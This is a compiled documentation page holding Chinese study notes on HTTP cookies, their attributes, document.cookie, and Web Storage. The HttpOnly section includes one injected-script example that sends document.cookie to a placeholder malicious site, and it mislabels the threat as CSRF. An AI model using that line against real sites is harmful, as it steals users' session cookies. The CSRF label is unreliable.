import{_ as s,o as n,c as a,O as l}from"./chunks/framework.4afe7240.js";const F=JSON.parse('{"title":"","description":"","frontmatter":{},"headers":[],"relativePath":"【离线】 Cookie Storage.md","filePath":"【离线】 Cookie Storage.md"}'),p={name:"【离线】 Cookie Storage.md"},o=l(`<div class="language-javascript"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">Cookie 是服务器保存在浏览器的一小段文本信息，</span><span style="color:#676E95;font-style:italic;">//一般30个键值对,4KB。</span></span>
<span class="line"><span style="color:#A6ACCD;">        由 HTTP 协议生成，也主要是供 HTTP 协议使用</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">浏览器每次向服务器发出请求，就会自动附上这段信息</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#82AAFF;">主机端口一致</span><span style="color:#A6ACCD;">(就可以共享 Cookie)</span></span>
<span class="line"><span style="color:#89DDFF;">        </span><span style="color:#676E95;font-style:italic;">//window.navigator.cookieEnabled // 浏览器是否打开 Cookie 功能    </span></span>
<span class="line"><span style="color:#FFCB6B;">用来</span><span style="color:#89DDFF;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">    1</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">分辨两个请求是否来自同一个浏览器</span></span>
<span class="line"><span style="color:#A6ACCD;">    2</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">对话（session）管理：保存登录、购物车等需要记录的信息。</span></span>
<span class="line"><span style="color:#A6ACCD;">    3</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">个性化：保存用户的偏好，比如网页的字体大小、背景色等等。</span></span>
<span class="line"><span style="color:#A6ACCD;">   4</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">追踪：记录和分析用户行为。  </span></span>
<span class="line"><span style="color:#A6ACCD;">       </span></span>
<span class="line"><span style="color:#A6ACCD;">           </span></span>
<span class="line"><span style="color:#A6ACCD;">Response时：</span><span style="color:#676E95;font-style:italic;">//服务器在浏览器写入一个 Cookie</span></span>
<span class="line"><span style="color:#A6ACCD;">    生成     </span></span>
<span class="line"><span style="color:#A6ACCD;">        HTTP</span><span style="color:#89DDFF;">/</span><span style="color:#F78C6C;">1.0</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">200</span><span style="color:#A6ACCD;"> OK</span></span>
<span class="line"><span style="color:#A6ACCD;">        Content</span><span style="color:#89DDFF;">-</span><span style="color:#FFCB6B;">type</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> text</span><span style="color:#89DDFF;">/</span><span style="color:#A6ACCD;">html</span></span>
<span class="line"><span style="color:#A6ACCD;">        Set</span><span style="color:#89DDFF;">-</span><span style="color:#FFCB6B;">Cookie</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&lt;</span><span style="color:#FFCB6B;">cookie-name</span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;">=</span><span style="color:#89DDFF;">&lt;</span><span style="color:#FFCB6B;">cookie-value</span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;">; Expires=</span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">date</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">        Set-Cookie: </span><span style="color:#89DDFF;">&lt;</span><span style="color:#FFCB6B;">cookie-name</span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;">=</span><span style="color:#89DDFF;">&lt;</span><span style="color:#FFCB6B;">cookie-value</span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;">; Max-Age=</span><span style="color:#89DDFF;">&lt;</span><span style="color:#FFCB6B;">non-zero-digit</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">        Set-Cookie: </span><span style="color:#89DDFF;">&lt;</span><span style="color:#FFCB6B;">cookie-name</span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;">=</span><span style="color:#89DDFF;">&lt;</span><span style="color:#FFCB6B;">cookie-value</span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;">; Domain=</span><span style="color:#89DDFF;">&lt;</span><span style="color:#FFCB6B;">domain-value</span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;">; Secure; HttpOnly</span></span>
<span class="line"><span style="color:#A6ACCD;">        Set-Cookie: </span><span style="color:#89DDFF;">&lt;</span><span style="color:#FFCB6B;">cookie-name</span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;">=</span><span style="color:#89DDFF;">&lt;</span><span style="color:#FFCB6B;">cookie-value</span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;">; Path=</span><span style="color:#89DDFF;">&lt;</span><span style="color:#FFCB6B;">path-value</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">        eg:</span></span>
<span class="line"><span style="color:#A6ACCD;">            Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</span></span>
<span class="line"><span style="color:#A6ACCD;">    修改</span></span>
<span class="line"><span style="color:#A6ACCD;">        服务器改早先设置的 Cookie，必须同时满足四个条件：</span></span>
<span class="line"><span style="color:#A6ACCD;">            Cookie 的key、domain、path和secure都匹配。</span></span>
<span class="line"><span style="color:#A6ACCD;">        Set-Cookie: key1=value1; domain=example.com; path=/blog</span></span>
<span class="line"><span style="color:#A6ACCD;">            //改变上面这个 Cookie 的值，就必须使用同样的Set-Cookie。</span></span>
<span class="line"><span style="color:#A6ACCD;">            Set-Cookie: key1=value2; domain=example.com; path=/blog</span></span>
<span class="line"><span style="color:#A6ACCD;">                //只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。</span></span>
<span class="line"><span style="color:#A6ACCD;">                Set-Cookie: key1=value2; domain=example.com; path=/</span></span>
<span class="line"><span style="color:#A6ACCD;">                    //上面的命令设置了一个全新的同名 Cookie，但是path属性不一样。下一次访问example.com/blog的时候，浏览器将向服务器发送两个同名的 Cookie。</span></span>
<span class="line"><span style="color:#A6ACCD;">                        Request时:</span></span>
<span class="line"><span style="color:#A6ACCD;">                            Cookie: key1=value1; key1=value2</span></span>
<span class="line"><span style="color:#A6ACCD;">                        //上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面,path=/blog排在path=/ 前面。                </span></span>
<span class="line"><span style="color:#A6ACCD;">Request时: //浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器</span></span>
<span class="line"><span style="color:#A6ACCD;">    发送</span></span>
<span class="line"><span style="color:#A6ACCD;">        //每个请求都会带上相应的 Cookie</span></span>
<span class="line"><span style="color:#A6ACCD;">        GET /sample_page.html HTTP/1.1</span></span>
<span class="line"><span style="color:#A6ACCD;">        Host: www.example.org</span></span>
<span class="line"><span style="color:#A6ACCD;">        Cookie: yummy_cookie=choco; tasty_cookie=strawberry</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span></span>
<span class="line"><span style="color:#A6ACCD;">        服务器无法知道</span></span>
<span class="line"><span style="color:#A6ACCD;">            1.Cookie 的各种属性，比如何时过期。</span></span>
<span class="line"><span style="color:#A6ACCD;">            2.Cookie到底是一级域名设的，还是某一个二级域名设的。</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span></span>
<span class="line"><span style="color:#A6ACCD;">        </span></span>
<span class="line"><span style="color:#A6ACCD;">Cookie 的7个属性: depm ssh</span></span>
<span class="line"><span style="color:#A6ACCD;">    1 Domain(请求哪些域名需要带该cookie)</span></span>
<span class="line"><span style="color:#A6ACCD;">    2 Path(请求哪些路径需要带该cookie)  </span></span>
<span class="line"><span style="color:#A6ACCD;">        eg: PATH属性是&#39;/&#39;，那么请求&#39;/docs&#39;路径包含&#39;/&#39;, 那它就需要带Cookie</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span></span>
<span class="line"><span style="color:#A6ACCD;">    3 Expires(过期就删掉)</span></span>
<span class="line"><span style="color:#A6ACCD;">        //UTC 格式，可以使用Date.prototype.toUTCString()进行格式转换。</span></span>
<span class="line"><span style="color:#A6ACCD;">        Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; &#39;浏览器根据本地时间，所以是不精确的&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    4 Max-Age(多少秒后删掉)</span></span>
<span class="line"><span style="color:#A6ACCD;">        &#39;覆盖Expires&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    /如果不设置该Expires或Max-Age，或者设为null，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除/</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">        </span></span>
<span class="line"><span style="color:#A6ACCD;">    5 Secure(HTTPS才能发送该cooike)    </span></span>
<span class="line"><span style="color:#A6ACCD;">    6 HttpOnly(JS不能访问该cookie)</span></span>
<span class="line"><span style="color:#A6ACCD;">        防止(CRSF攻击)</span></span>
<span class="line"><span style="color:#A6ACCD;">        eg: 另一个网站注入了:(new Image()).src = &quot;http://恶意网站/接收cookie?cookie=&quot; + document.cookie;</span></span>
<span class="line"><span style="color:#A6ACCD;">            从而获取到我的cookie</span></span>
<span class="line"><span style="color:#A6ACCD;">    7 SameSite(A网站嵌入B的链接, 点击B链接会带B的cookie过去, 限制它)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">document.cookie(用于读写当前网页的 Cookie)</span></span>
<span class="line"><span style="color:#A6ACCD;">    删除(唯一方法是expires搞过期)        </span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">    增加(必须都写对才能成功增加,失败不提示的)</span></span>
<span class="line"><span style="color:#A6ACCD;">        一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加</span></span>
<span class="line"><span style="color:#A6ACCD;">            document.cookie = &#39;fontSize=14; &#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">                              + &#39;expires=&#39; + someDate.toGMTString() + &#39;; &#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">                              + &#39;path=/subdirectory; &#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">                              + &#39;domain=*.example.com&#39;;</span></span>
<span class="line"><span style="color:#A6ACCD;">            document.cookie = &#39;test2=world&#39;;</span></span>
<span class="line"><span style="color:#A6ACCD;">            document.cookie        // fontSize=14; test2=world</span></span></code></pre></div><hr><blockquote><p>【浏览器存储】 WebStorage(localStorage)</p></blockquote><div class="language-javascript"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">存储大小最大为5M</span></span>
<span class="line"><span style="color:#A6ACCD;">sessionStorage  保存的数据用于浏览器的一次会话（session）</span></span>
<span class="line"><span style="color:#A6ACCD;">    通过点击链接（或者用了 window</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">open）打开的新标签页之间是属于同一个 session 的，</span></span>
<span class="line"><span style="color:#A6ACCD;">    但新开一个标签页总是会初始化一个新的 session，即使网站是一样的，它们也不属于同一个 session</span></span>
<span class="line"><span style="color:#A6ACCD;">localStorage    保存的数据长期存在</span></span>
<span class="line"></span>
<span class="line"><span style="color:#89DDFF;">    </span><span style="color:#676E95;font-style:italic;">//增</span></span>
<span class="line"><span style="color:#A6ACCD;">    localStorage</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">val</span><span style="color:#89DDFF;">=</span><span style="color:#F78C6C;">1</span></span>
<span class="line"><span style="color:#89DDFF;">    </span><span style="color:#676E95;font-style:italic;">//查</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#C792EA;">var</span><span style="color:#A6ACCD;"> a</span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;">localStorage</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">val </span><span style="color:#676E95;font-style:italic;">//1</span></span>
<span class="line"><span style="color:#89DDFF;">    </span><span style="color:#676E95;font-style:italic;">//删</span></span>
<span class="line"><span style="color:#A6ACCD;">    localStorage</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">removeItem</span><span style="color:#A6ACCD;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">val</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">)</span><span style="color:#89DDFF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#676E95;font-style:italic;">//监听</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;">//!! 在同一个网页修改本地存储，又在同一个网页监听，这样是没有效果的</span></span>
<span class="line"><span style="color:#A6ACCD;">window</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">addEventListener</span><span style="color:#A6ACCD;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">storage</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> (e) </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">  console.log(e.key);</span><span style="color:#676E95;font-style:italic;">//key/newValue/oldValue/storageArea所有键值对/url另一个页面触发storege的地址</span></span>
<span class="line"><span style="color:#89DDFF;">}</span><span style="color:#A6ACCD;">)</span><span style="color:#89DDFF;">;</span></span></code></pre></div>`,4),e=[o];function t(c,C,r,i,A,y){return n(),a("div",null,e)}const k=s(p,[["render",t]]);export{F as __pageData,k as default};
